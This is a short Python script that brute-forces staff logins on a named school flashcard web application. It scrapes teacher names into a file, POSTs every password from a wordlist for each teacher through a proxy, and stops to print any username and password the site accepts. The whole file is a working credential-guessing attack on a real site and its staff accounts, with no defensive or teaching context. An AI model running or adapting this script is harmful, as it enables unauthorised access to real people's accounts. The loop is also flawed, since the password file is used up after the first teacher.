import requests
passwords = open("passwords.txt", "r")
teachers = open("teacher2.txt", "r")
url = "http://bert.stuy.edu/pbrooks/flashcard/flashcard.py"
#cat cTeacher.txt | sed -e 's/<option value=\(.*\)>/\1/' |  cut -f1,2 -d'"' | cut -c 2-  > teacher2.txt

proxyDict = { 
              "http"  : "http://149.89.1.30:3128",
              "https" : "https://149.89.1.30:3128"
            }


for teacher in teachers:
    print(teacher)
    for password in passwords:
        #if lastResponse:
        data = {"password": password, "staff":teacher.strip("\n"),"teacher":"AMBIA", "teacher-login":"Next"}
        r = requests.post(url = url, data = data,  proxies=proxyDict) 

        response = r.text 
        print(password)
        if "Password incorrect" not in response:
            
            print(teacher.strip("\n"), ":", password)
            input("-->")

